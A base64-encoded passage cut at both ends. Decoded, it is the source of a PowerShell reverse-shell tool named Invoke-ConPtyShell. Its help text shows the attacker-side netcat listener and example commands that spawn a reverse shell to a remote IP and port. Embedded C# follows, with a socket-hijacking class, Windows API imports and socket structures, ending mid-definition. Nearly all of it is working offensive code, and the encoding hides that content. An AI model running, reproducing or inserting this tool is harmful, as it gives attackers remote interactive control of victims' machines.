GNvbW1hbmQ6CiAgICAgICAgICAgICAgICBzdHR5IHJhdyAtZWNobzsgKHN0dHkgc2l6ZTsgY2F0KSB8IG5jIC1sdm5wIDMwMDEKICAgICAgICAgICAKICAgICAgICAgICAgSWYgeW91IHdhbnQgdG8gY2hhbmdlIHRoZSBjb25zb2xlIHNpemUgZGlyZWN0bHkgZnJvbSBwb3dlcnNoZWxsCiAgICAgICAgICAgIHlvdSBjYW4gcGFzdGUgdGhlIGZvbGxvd2luZyBjb21tYW5kczoKICAgICAgICAgICAgICAgICR3aWR0aD04MAogICAgICAgICAgICAgICAgJGhlaWdodD0yNAogICAgICAgICAgICAgICAgJEhvc3QuVUkuUmF3VUkuQnVmZmVyU2l6ZSA9IE5ldy1PYmplY3QgTWFuYWdlbWVudC5BdXRvbWF0aW9uLkhvc3QuU2l6ZSAoJHdpZHRoLCAkaGVpZ2h0KQogICAgICAgICAgICAgICAgJEhvc3QuVUkuUmF3VUkuV2luZG93U2l6ZSA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uSG9zdC5TaXplIC1Bcmd1bWVudExpc3QgKCR3aWR0aCwgJGhlaWdodCkKICAgICAgICAgICAgCiAgICAgICAgICAgIAogICAgICAgIC5QQVJBTUVURVIgUmVtb3RlSXAKICAgICAgICAgICAgVGhlIHJlbW90ZSBpcCB0byBjb25uZWN0CiAgICAgICAgLlBBUkFNRVRFUiBSZW1vdGVQb3J0CiAgICAgICAgICAgIFRoZSByZW1vdGUgcG9ydCB0byBjb25uZWN0CiAgICAgICAgLlBBUkFNRVRFUiBSb3dzCiAgICAgICAgICAgIFJvd3Mgc2l6ZSBmb3IgdGhlIGNvbnNvbGUKICAgICAgICAgICAgRGVmYXVsdDogIjI0IgogICAgICAgIC5QQVJBTUVURVIgQ29scwogICAgICAgICAgICBDb2xzIHNpemUgZm9yIHRoZSBjb25zb2xlCiAgICAgICAgICAgIERlZmF1bHQ6ICI4MCIKICAgICAgICAuUEFSQU1FVEVSIENvbW1hbmRMaW5lCiAgICAgICAgICAgIFRoZSBjb21tYW5kbGluZSBvZiB0aGUgcHJvY2VzcyB0aGF0IHlvdSBhcmUgZ29pbmcgdG8gaW50ZXJhY3QKICAgICAgICAgICAgRGVmYXVsdDogInBvd2Vyc2hlbGwuZXhlIgogICAgICAgICAgICAKICAgICAgICAuRVhBTVBMRSAgCiAgICAgICAgICAgIFBTPkludm9rZS1Db25QdHlTaGVsbCAxMC4wLjAuMiAzMDAxCiAgICAgICAgICAgIAogICAgICAgICAgICBEZXNjcmlwdGlvbgogICAgICAgICAgICAtLS0tLS0tLS0tLQogICAgICAgICAgICBTcGF3biBhIHJldmVyc2Ugc2hlbGwKCiAgICAgICAgLkVYQU1QTEUKICAgICAgICAgICAgUFM+SW52b2tlLUNvblB0eVNoZWxsIC1SZW1vdGVJcCAxMC4wLjAuMiAtUmVtb3RlUG9ydCAzMDAxIC1Sb3dzIDMwIC1Db2xzIDkwCiAgICAgICAgICAgIAogICAgICAgICAgICBEZXNjcmlwdGlvbgogICAgICAgICAgICAtLS0tLS0tLS0tLQogICAgICAgICAgICBTcGF3biBhIHJldmVyc2Ugc2hlbGwgd2l0aCBzcGVjaWZpYyByb3dzIGFuZCBjb2xzIHNpemUKICAgICAgICAgICAgCiAgICAgICAgIC5FWEFNUExFCiAgICAgICAgICAgIFBTPkludm9rZS1Db25QdHlTaGVsbCAtUmVtb3RlSXAgMTAuMC4wLjIgLVJlbW90ZVBvcnQgMzAwMSAtUm93cyAzMCAtQ29scyA5MCAtQ29tbWFuZExpbmUgY21kLmV4ZQogICAgICAgICAgICAKICAgICAgICAgICAgRGVzY3JpcHRpb24KICAgICAgICAgICAgLS0tLS0tLS0tLS0KICAgICAgICAgICAgU3Bhd24gYSByZXZlcnNlIHNoZWxsIChjbWQuZXhlKSB3aXRoIHNwZWNpZmljIHJvd3MgYW5kIGNvbHMgc2l6ZQogICAgICAgICAgICAKICAgICAgICAuRVhBTVBMRQogICAgICAgICAgICBQUz5JbnZva2UtQ29uUHR5U2hlbGwgLVVwZ3JhZGUgLVJvd3MgMzAgLUNvbHMgOTAKICAgICAgICAgICAgCiAgICAgICAgICAgIERlc2NyaXB0aW9uCiAgICAgICAgICAgIC0tLS0tLS0tLS0tCiAgICAgICAgICAgIFVwZ3JhZGUgeW91ciBjdXJyZW50IHNoZWxsIHdpdGggc3BlY2lmaWMgcm93cyBhbmQgY29scyBzaXplCiAgICAgICAgICAgIAogICAgIz4KICAgIFBhcmFtCiAgICAoCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDApXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFJlbW90ZUlwLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRSZW1vdGVQb3J0LAoKICAgICAgICBbUGFyYW1ldGVyKCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkUm93cyA9ICIyNCIsCgogICAgICAgIFtQYXJhbWV0ZXIoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb2xzID0gIjgwIiwKCiAgICAgICAgW1BhcmFtZXRlcigpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbW1hbmRMaW5lID0gInBvd2Vyc2hlbGwuZXhlIiwKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKCldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVXBncmFkZQogICAgKQogICAgCiAgICBpZiggJFBTQm91bmRQYXJhbWV0ZXJzLkNvbnRhaW5zS2V5KCdVcGdyYWRlJykgKSB7CiAgICAgICAgJFJlbW90ZUlwID0gInVwZ3JhZGUiCiAgICAgICAgJFJlbW90ZVBvcnQgPSAic2hlbGwiCiAgICB9CiAgICBlbHNlewogIAogICAgICAgIGlmKC1Ob3QoJFBTQm91bmRQYXJhbWV0ZXJzLkNvbnRhaW5zS2V5KCdSZW1vdGVJcCcpKSkgewogICAgICAgICAgICB0aHJvdyAiUmVtb3RlSXAgbWlzc2luZyBwYXJhbWV0ZXIiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIGlmKC1Ob3QoJFBTQm91bmRQYXJhbWV0ZXJzLkNvbnRhaW5zS2V5KCdSZW1vdGVQb3J0JykpKSB7CiAgICAgICAgICAgIHRocm93ICJSZW1vdGVQb3J0IG1pc3NpbmcgcGFyYW1ldGVyIgogICAgICAgIH0KICAgIH0KICAgICRwYXJhbWV0ZXJzQ29uUHR5U2hlbGwgPSBAKCRSZW1vdGVJcCwgJFJlbW90ZVBvcnQsICRSb3dzLCAkQ29scywgJENvbW1hbmRMaW5lKQogICAgQWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uICRTb3VyY2UgLUxhbmd1YWdlIENTaGFycDsKICAgICRvdXRwdXQgPSBbQ29uUHR5U2hlbGxNYWluQ2xhc3NdOjpDb25QdHlTaGVsbE1haW4oJHBhcmFtZXRlcnNDb25QdHlTaGVsbCkKICAgIFdyaXRlLU91dHB1dCAkb3V0cHV0Cn0KCiRTb3VyY2UgPSBAIgoKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uSU87CnVzaW5nIFN5c3RlbS5UZXh0Owp1c2luZyBTeXN0ZW0uVGhyZWFkaW5nOwp1c2luZyBTeXN0ZW0uTmV0Owp1c2luZyBTeXN0ZW0uTmV0LlNvY2tldHM7CnVzaW5nIFN5c3RlbS5OZXQuTmV0d29ya0luZm9ybWF0aW9uOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CnVzaW5nIFN5c3RlbS5EaWFnbm9zdGljczsKdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7CgpwdWJsaWMgY2xhc3MgQ29uUHR5U2hlbGxFeGNlcHRpb24gOiBFeGNlcHRpb24KewogICAgcHJpdmF0ZSBjb25zdCBzdHJpbmcgZXJyb3Jfc3RyaW5nID0gIlstXSBDb25QdHlTaGVsbEV4Y2VwdGlvbjogIjsKCiAgICBwdWJsaWMgQ29uUHR5U2hlbGxFeGNlcHRpb24oKSB7IH0KCiAgICBwdWJsaWMgQ29uUHR5U2hlbGxFeGNlcHRpb24oc3RyaW5nIG1lc3NhZ2UpIDogYmFzZShlcnJvcl9zdHJpbmcgKyBtZXNzYWdlKSB7IH0KfQoKcHVibGljIGNsYXNzIERlYWRsb2NrQ2hlY2tIZWxwZXIKewoKICAgIHByaXZhdGUgYm9vbCBkZWFkbG9ja0RldGVjdGVkOwogICAgcHJpdmF0ZSBJbnRQdHIgdGFyZ2V0SGFuZGxlOwoKICAgIHByaXZhdGUgZGVsZWdhdGUgdWludCBMUFRIUkVBRF9TVEFSVF9ST1VUSU5FKHVpbnQgbHBQYXJhbSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBDbG9zZUhhbmRsZShJbnRQdHIgaE9iamVjdCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gVUludDMyIFdhaXRGb3JTaW5nbGVPYmplY3QoSW50UHRyIGhIYW5kbGUsIFVJbnQzMiBkd01pbGxpc2Vjb25kcyk7CgogICAgW0RsbEltcG9ydCgiS2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50UHRyIENyZWF0ZVRocmVhZCh1aW50IGxwVGhyZWFkQXR0cmlidXRlcywgdWludCBkd1N0YWNrU2l6ZSwgTFBUSFJFQURfU1RBUlRfUk9VVElORSBscFN0YXJ0QWRkcmVzcywgSW50UHRyIGxwUGFyYW1ldGVyLCB1aW50IGR3Q3JlYXRpb25GbGFncywgb3V0IHVpbnQgbHBUaHJlYWRJZCk7CgogICAgcHJpdmF0ZSB1aW50IFRocmVhZENoZWNrRGVhZGxvY2sodWludCB0aHJlYWRQYXJhbXMpCiAgICB7CiAgICAgICAgSW50UHRyIG9ialB0ciA9IEludFB0ci5aZXJvOwogICAgICAgIG9ialB0ciA9IFNvY2tldEhpamFja2luZy5OdFF1ZXJ5T2JqZWN0RHluYW1pYyh0aGlzLnRhcmdldEhhbmRsZSwgU29ja2V0SGlqYWNraW5nLk9CSkVDVF9JTkZPUk1BVElPTl9DTEFTUy5PYmplY3ROYW1lSW5mb3JtYXRpb24sIDApOwogICAgICAgIHRoaXMuZGVhZGxvY2tEZXRlY3RlZCA9IGZhbHNlOwogICAgICAgIGlmIChvYmpQdHIgIT0gSW50UHRyLlplcm8pIE1hcnNoYWwuRnJlZUhHbG9iYWwob2JqUHRyKTsKICAgICAgICByZXR1cm4gMDsKICAgIH0KCiAgICBwdWJsaWMgYm9vbCBDaGVja0RlYWRsb2NrRGV0ZWN0ZWQoSW50UHRyIHRIYW5kbGUpCiAgICB7CiAgICAgICAgdGhpcy5kZWFkbG9ja0RldGVjdGVkID0gdHJ1ZTsKICAgICAgICB0aGlzLnRhcmdldEhhbmRsZSA9IHRIYW5kbGU7CiAgICAgICAgTFBUSFJFQURfU1RBUlRfUk9VVElORSBkZWxlZ2F0ZVRocmVhZENoZWNrRGVhZGxvY2sgPSBuZXcgTFBUSFJFQURfU1RBUlRfUk9VVElORSh0aGlzLlRocmVhZENoZWNrRGVhZGxvY2spOwogICAgICAgIEludFB0ciBoVGhyZWFkID0gSW50UHRyLlplcm87CiAgICAgICAgdWludCB0aHJlYWRJZCA9IDA7CiAgICAgICAgLy93ZSBuZWVkIG5hdGl2ZSB0aHJlYWRzLCBDIyB0aHJlYWRzIGhhbmcgYW5kIGdvIGluIGxvY2suIFdlIG5lZWQgdG8gYXZvaWRzIGhhbmdzIG9uIG5hbWVkIHBpcGUgc28uLi4gTm8gaGFuZ3Mgbm8gZGVhZGxvY2tzLi4uIG5vIHBhaW4gbm8gZ2FpbnMuLi4KICAgICAgICBoVGhyZWFkID0gQ3JlYXRlVGhyZWFkKDAsIDAsIGRlbGVnYXRlVGhyZWFkQ2hlY2tEZWFkbG9jaywgSW50UHRyLlplcm8sIDAsIG91dCB0aHJlYWRJZCk7CiAgICAgICAgV2FpdEZvclNpbmdsZU9iamVjdChoVGhyZWFkLCAxNTAwKTsKICAgICAgICAvL3dlIGRvIG5vdCBraWxsIHRoZSAicGVuZGluZyIgdGhyZWFkcyBoZXJlIHdpdGggVGVybWluYXRlVGhyZWFkKCkgYmVjYXVzZSBpdCB3aWxsIGNyYXNoIHRoZSB3aG9sZSBwcm9jZXNzIGlmIHdlIGRvIGl0IG9uIGxvY2tlZCB0aHJlYWRzLgogICAgICAgIC8vanVzdCBzb21lIHdhc3RlIG9mIHRocmVhZHMgOigKICAgICAgICBDbG9zZUhhbmRsZShoVGhyZWFkKTsKICAgICAgICByZXR1cm4gdGhpcy5kZWFkbG9ja0RldGVjdGVkOwogICAgfQp9CgpwdWJsaWMgc3RhdGljIGNsYXNzIFNvY2tldEhpamFja2luZwp7CgogICAgcHJpdmF0ZSBjb25zdCB1aW50IE5UU1RBVFVTX1NVQ0NFU1MgPSAweDAwMDAwMDAwOwogICAgcHJpdmF0ZSBjb25zdCB1aW50IE5UU1RBVFVTX0lORk9MRU5HVEhNSVNNQVRDSCA9IDB4YzAwMDAwMDQ7CiAgICBwcml2YXRlIGNvbnN0IHVpbnQgTlRTVEFUVVNfQlVGRkVST1ZFUkZMT1cgPSAweDgwMDAwMDA1OwogICAgcHJpdmF0ZSBjb25zdCB1aW50IE5UU1RBVFVTX0JVRkZFUlRPT1NNQUxMID0gMHhjMDAwMDAyMzsKICAgIHByaXZhdGUgY29uc3QgaW50IE5UU1RBVFVTX1BFTkRJTkcgPSAweDAwMDAwMTAzOwogICAgcHJpdmF0ZSBjb25zdCBpbnQgV1NBX0ZMQUdfT1ZFUkxBUFBFRCA9IDB4MTsKICAgIHByaXZhdGUgY29uc3QgaW50IERVUExJQ0FURV9TQU1FX0FDQ0VTUyA9IDB4MjsKICAgIHByaXZhdGUgY29uc3QgaW50IFN5c3RlbUhhbmRsZUluZm9ybWF0aW9uID0gMTY7CiAgICBwcml2YXRlIGNvbnN0IGludCBQUk9DRVNTX0RVUF9IQU5ETEUgPSAweDAwNDA7CiAgICBwcml2YXRlIGNvbnN0IGludCBTSU9fVENQX0lORk8gPSB1bmNoZWNrZWQoKGludCkweEQ4MDAwMDI3KTsKICAgIHByaXZhdGUgY29uc3QgaW50IFNHX1VOQ09OU1RSQUlORURfR1JPVVAgPSAweDE7CiAgICBwcml2YXRlIGNvbnN0IGludCBTR19DT05TVFJBSU5FRF9HUk9VUCA9IDB4MjsKICAgIHByaXZhdGUgY29uc3QgdWludCBJT0NUTF9BRkRfR0VUX0NPTlRFWFQgPSAweDEyMDQzOwogICAgcHJpdmF0ZSBjb25zdCBpbnQgRVZFTlRfQUxMX0FDQ0VTUyA9IDB4MWYwMDAzOwogICAgcHJpdmF0ZSBjb25zdCBpbnQgU3luY2hyb25pemF0aW9uRXZlbnQgPSAxOwogICAgcHJpdmF0ZSBjb25zdCBVSW50MzIgSU5GSU5JVEUgPSAweEZGRkZGRkZGOwoKCiAgICBwcml2YXRlIGVudW0gU09DS0VUX1NUQVRFIDogdWludAogICAgewogICAgICAgIFNvY2tldE9wZW4gPSAwLAogICAgICAgIFNvY2tldEJvdW5kID0gMSwKICAgICAgICBTb2NrZXRCb3VuZFVkcCA9IDIsCiAgICAgICAgU29ja2V0Q29ubmVjdGVkID0gMywKICAgICAgICBTb2NrZXRDbG9zZWQgPSAzCiAgICB9CgogICAgcHJpdmF0ZSBlbnVtIEFGRF9HUk9VUF9UWVBFIDogdWludAogICAgewogICAgICAgIEdyb3VwVHlwZU5laXRoZXIgPSAwLAogICAgICAgIEdyb3VwVHlwZUNvbnN0cmFpbmVkID0gU0dfQ09OU1RSQUlORURfR1JPVVAsCiAgICAgICAgR3JvdXBUeXBlVW5jb25zdHJhaW5lZCA9IFNHX1VOQ09OU1RSQUlORURfR1JPVVAKICAgIH0KCiAgICBwdWJsaWMgZW51bSBPQkpFQ1RfSU5GT1JNQVRJT05fQ0xBU1MgOiBpbnQKICAgIHsKICAgICAgICBPYmplY3RCYXNpY0luZm9ybWF0aW9uID0gMCwKICAgICAgICBPYmplY3ROYW1lSW5mb3JtYXRpb24gPSAxLAogICAgICAgIE9iamVjdFR5cGVJbmZvcm1hdGlvbiA9IDIsCiAgICAgICAgT2JqZWN0QWxsVHlwZXNJbmZvcm1hdGlvbiA9IDMsCiAgICAgICAgT2JqZWN0SGFuZGxlSW5mb3JtYXRpb24gPSA0CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIFBhY2sgPSAxKV0KICAgIHByaXZhdGUgc3RydWN0IFNZU1RFTV9IQU5ETEVfVEFCTEVfRU5UUllfSU5GTwogICAgewogICAgICAgIHB1YmxpYyB1c2hvcnQgVW5pcXVlUHJvY2Vzc0lkOwogICAgICAgIHB1YmxpYyB1c2hvcnQgQ3JlYXRvckJhY2tUcmFjZUluZGV4OwogICAgICAgIHB1YmxpYyBieXRlIE9iamVjdFR5cGVJbmRleDsKICAgICAgICBwdWJsaWMgYnl0ZSBIYW5kbGVBdHRyaWJ1dGVzOwogICAgICAgIHB1YmxpYyB1c2hvcnQgSGFuZGxlVmFsdWU7CiAgICAgICAgcHVibGljIEludFB0ciBPYmplY3Q7CiAgICAgICAgcHVibGljIEludFB0ciBHcmFudGVkQWNjZXNzOwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgIHByaXZhdGUgc3RydWN0IEdFTkVSSUNfTUFQUElORwogICAgewogICAgICAgIHB1YmxpYyBpbnQgR2VuZXJpY1JlYWQ7CiAgICAgICAgcHVibGljIGludCBHZW5lcmljV3JpdGU7CiAgICAgICAgcHVibGljIGludCBHZW5lcmljRXhlY3V0ZTsKICAgICAgICBwdWJsaWMgaW50IEdlbmVyaWNBbGw7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIFBhY2sgPSAxKV0KICAgIHByaXZhdGUgc3RydWN0IE9CSkVDVF9UWVBFX0lORk9STUFUSU9OX1YyCiAgICB7CiAgICAgICAgcHVibGljIFVOSUNPREVfU1RSSU5HIFR5cGVOYW1lOwogICAgICAgIHB1YmxpYyB1aW50IFRvdGFsTnVtYmVyT2ZPYmplY3RzOwogICAgICAgIHB1YmxpYyB1aW50IFRvdGFsTnVtYmVyT2ZIYW5kbGVzOwogICAgICAgIHB1YmxpYyB1aW50IFRvdGFsUGFnZWRQb29sVXNhZ2U7CiAgICAgICAgcHVibGljIHVpbnQgVG90YWxOb25QYWdlZFBvb2xVc2FnZTsKICAgICAgICBwdWJsaWMgdWludCBUb3RhbE5hbWVQb29sVXNhZ2U7CiAgICAgICAgcHVibGljIHVpbnQgVG90YWxIYW5kbGVUYWJsZVVzYWdlOwogICAgICAgIHB1YmxpYyB1aW50IEhpZ2hXYXRlck51bWJlck9mT2JqZWN0czsvLyBQZWFrT2JqZWN0Q291bnQ7CiAgICAgICAgcHVibGljIHVpbnQgSGlnaFdhdGVyTnVtYmVyT2ZIYW5kbGVzOy8vIFBlYWtIYW5kbGVDb3VudDsKICAgICAgICBwdWJsaWMgdWludCBIaWdoV2F0ZXJQYWdlZFBvb2xVc2FnZTsKICAgICAgICBwdWJsaWMgdWludCBIaWdoV2F0ZXJOb25QYWdlZFBvb2xVc2FnZTsKICAgICAgICBwdWJsaWMgdWludCBIaWdoV2F0ZXJOYW1lUG9vbFVzYWdlOwogICAgICAgIHB1YmxpYyB1aW50IEhpZ2hXYXRlckhhbmRsZVRhYmxlVXNhZ2U7CiAgICAgICAgcHVibGljIHVpbnQgSW52YWxpZEF0dHJpYnV0ZXM7CiAgICAgICAgcHVibGljIEdFTkVSSUNfTUFQUElORyBHZW5lcmljTWFwcGluZzsKICAgICAgICBwdWJsaWMgdWludCBWYWxpZEFjY2Vzc01hc2s7CiAgICAgICAgcHVibGljIGJ5dGUgU2VjdXJpdHlSZXF1aXJlZDsvL2Jvb2wKICAgICAgICBwdWJsaWMgYnl0ZSBNYWludGFpbkhhbmRsZUNvdW50Oy8vYm9vbAogICAgICAgIHB1YmxpYyBieXRlIFR5cGVJbmRleDsKICAgICAgICBwdWJsaWMgYnl0ZSBSZXNlcnZlZEJ5dGU7CiAgICAgICAgcHVibGljIHVpbnQgUG9vbFR5cGU7CiAgICAgICAgcHVibGljIHVpbnQgRGVmYXVsdFBhZ2VkUG9vbENoYXJnZTsvLyBQYWdlZFBvb2xVc2FnZTsKICAgICAgICBwdWJsaWMgdWludCBEZWZhdWx0Tm9uUGFnZWRQb29sQ2hhcmdlOy8vTm9uUGFnZWRQb29sVXNhZ2U7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIFBhY2sgPSAxKV0KICAgIHByaXZhdGUgc3RydWN0IE9CSkVDVF9OQU1FX0lORk9STUFUSU9OCiAgICB7CiAgICAgICAgcHVibGljIFVOSUNPREVfU1RSSU5HIE5hbWU7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgVU5JQ09ERV9TVFJJTkcKICAgIHsKICAgICAgICBwdWJsaWMgdXNob3J0IExlbmd0aDsKICAgICAgICBwdWJsaWMgdXNob3J0IE1heGltdW1MZW5ndGg7CiAgICAgICAgcHVibGljIEludFB0ciBCdWZmZXI7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgV1NBRGF0YQogICAgewogICAgICAgIHB1YmxpYyBzaG9ydCB3VmVyc2lvbjsKICAgICAgICBwdWJsaWMgc2hvcnQgd0hpZ2hWZXJzaW9uOwogICAgICAgIHB1YmxpYyBzaG9ydCBpTWF4U29ja2V0czsKICAgICAgICBwdWJsaWMgc2hvcnQgaU1heFVkcERnOwogICAgICAgIHB1YmxpYyBJbnRQdHIgbHBWZW5kb3JJbmZvOwogICAgICAgIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5CeVZhbFRTdHIsIFNpemVDb25zdCA9IDI1NyldCiAgICAgICAgcHVibGljIHN0cmluZyBzekRlc2NyaXB0aW9uOwogICAgICAgIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5CeVZhbFRTdHIsIFNpemVDb25zdCA9IDEyOSldCiAgICAgICAgcHVibGljIHN0cmluZyBzelN5c3RlbVN0YXR1czsKICAgIH0KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldCiAgICBwcml2YXRlIHN0cnVjdCBXU0FQUk9UT0NPTENIQUlOCiAgICB7CiAgICAgICAgcHVibGljIGludCBDaGFpbkxlbjsKICAgICAgICBbTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQnlWYWxBcnJheSwgU2l6ZUNvbnN0ID0gNyldCiAgICAgICAgcHVibGljIHVpbnRbXSBDaGFpbkVudHJpZXM7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8pXQogICAgcHJpdmF0ZSBzdHJ1Y3QgV1NBUFJPVE9DT0xfSU5GTwogICAgewogICAgICAgIHB1YmxpYyB1aW50IGR3U2VydmljZUZsYWdzMTsKICAgICAgICBwdWJsaWMgdWludCBkd1NlcnZpY2VGbGFnczI7CiAgICAgICAgcHVibGljIHVpbnQgZHdTZXJ2aWNlRmxhZ3MzOwogICAgICAgIHB1YmxpYyB1aW50IGR3U2VydmljZUZsYWdzNDsKICAgICAgICBwdWJsaWMgdWludCBkd1Byb3ZpZGVyRmxhZ3M7CiAgICAgICAgcHVibGljIEd1aWQgUHJvdmlkZXJJZDsKICAgICAgICBwdWJsaWMgdWludCBkd0NhdGFsb2dFbnRyeUlkOwogICAgICAgIHB1YmxpYyBXU0FQUk9UT0NPTENIQUlOIFByb3RvY29sQ2hhaW47CiAgICAgICAgcHVibGljIGludCBpVmVyc2lvbjsKICAgICAgICBwdWJsaWMgaW50IGlBZGRyZXNzRmFtaWx5OwogICAgICAgIHB1YmxpYyBpbnQgaU1heFNvY2tBZGRyOwogICAgICAgIHB1YmxpYyBpbnQgaU1pblNvY2tBZGRyOwogICAgICAgIHB1YmxpYyBpbnQgaVNvY2tldFR5cGU7CiAgICAgICAgcHVibGljIGludCBpUHJvdG9jb2w7CiAgICAgICAgcHVibGljIGludCBpUHJvdG9jb2xNYXhPZmZzZXQ7CiAgICAgICAgcHVibGljIGludCBpTmV0d29ya0J5dGVPcmRlcjsKICAgICAgICBwdWJsaWMgaW50IGlTZWN1cml0eVNjaGVtZTsKICAgICAgICBwdWJsaWMgdWludCBkd01lc3NhZ2VTaXplOwogICAgICAgIHB1YmxpYyB1aW50IGR3UHJvdmlkZXJSZXNlcnZlZDsKICAgICAgICBbTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQnlWYWxUU3RyLCBTaXplQ29uc3QgPSAyNTYpXQogICAgICAgIHB1YmxpYyBzdHJpbmcgc3pQcm90b2NvbDsKICAgIH0KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwcml2YXRlIHN0cnVjdCBTT0NLQUREUl9JTgogICAgewogICAgICAgIHB1YmxpYyBzaG9ydCBzaW5fZmFtaWx5OwogICAgICAgIHB1YmxpYyBzaG9ydCBzaW5fcG9ydDsKICAgICAgICBwdWJsaWMgdWludCBzaW5fYWRkcjsKICAgICAgICBwdWJsaWMgbG9uZyBzaW5femVybzsKICAgIH0KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwcml2YXRlIHN0cnVjdCBUQ1BfSU5GT192MAogICAgewogICAgICAgIHB1YmxpYyBUY3BTdGF0ZSBTdGF0ZTsKICAgICAgICBwdWJsaWMgVUludDMyIE1zczsKICAgICAgICBwdWJsaWMgVUludDY0IENvbm5lY3Rpb25UaW1lTXM7CiAgICAgICAgcHVibGljIGJ5dGUgVGltZXN0YW1wc0VuYWJsZWQ7CiAgICAgICAgcHVibGljIFVJbnQzMiBSdHRVczsKICAgICAgICBwdWJsaWMgVUludDMyIE1pblJ0dFVzOwogICAgICAgIHB1YmxpYyBVSW50MzIgQnl0ZXNJbkZsaWdodDsKICAgICAgICBwdWJsaWMgVUludDMyIEN3bmQ7CiAgICAgICAgcHVibGljIFVJbnQzMiBTbmRXbmQ7CiAgICAgICAgcHVibGljIFVJbnQzMiBSY3ZXbmQ7CiAgICAgICAgcHVibGljIFVJbnQzMiBSY3ZCdWY7CiAgICAgICAgcHVibGljIFVJbnQ2NCBCeXRlc091dDsKICAgICAgICBwdWJsaWMgVUludDY0IEJ5dGVzSW47CiAgICAgICAgcHVibGljIFVJbnQzMiBCeXRlc1Jlb3JkZXJlZDsKICAgICAgICBwdWJsaWMgVUludDMyIEJ5dGVzUmV0cmFuczsKICAgICAgICBwdWJsaWMgVUludDMyIEZhc3RSZXRyYW5zOwogICAgICAgIHB1YmxpYyBVSW50MzIgRHVwQWNrc0luOwogICAgICAgIHB1YmxpYyBVSW50MzIgVGltZW91dEVwaXNvZGVzOwogICAgICAgIHB1YmxpYyBieXRlIFN5blJldHJhbnM7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgbGluZ2VyCiAgICB7CiAgICAgICAgcHVibGljIFVJbnQxNiBsX29ub2ZmOwogICAgICAgIHB1YmxpYyBVSW50MTYgbF9saW5nZXI7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIFBhY2sgPSAwKV0KICAgIHByaXZhdGUgc3RydWN0IElPX1NUQVRVU19CTE9DSwogICAgewogICAgICAgIHB1YmxpYyBpbnQgc3RhdHVzOwogICAgICAgIHB1YmxpYyBJbnRQdHIgaW5mb3JtYXRpb247CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgU09DS19TSEFSRURfSU5GTwogICAgewogICAgICAgIHB1YmxpYyBTT0NLRVRfU1RBVEUgU3RhdGU7CiAgICAgICAgcHVibGljIEludDMyIEFkZHJlc3NGYW1pbHk7CiAgICAgICAgcHVibGljIEludDMyIFNvY2tldFR5cGU7CiAgICAgICAgcHVibGljIEludDMyIFByb3RvY29sOwogICAgICAgIHB1YmxpYyBJbnQzMiBMb2NhbEFkZHJlc3NMZW5ndGg7CiAgICAgICAgcHVibGljIEludDMyIFJlbW90ZUFkZHJlc3NMZW5ndGg7CgogICAgICAgIC8vIFNvY2tldCBvcHRpb25zIGNvbnRyb2xsZWQgYnkgZ2V0c29ja29wdCgpLCBzZXRzb2Nrb3B0KCkuCiAgICAgICAgcHVibGljIGxpbmdlciBMaW5nZXJJbmZvOwogICAgICAgIHB1YmxpYyBVSW50MzIgU2VuZFRpbWVvdXQ7CiAgICAgICAgcHV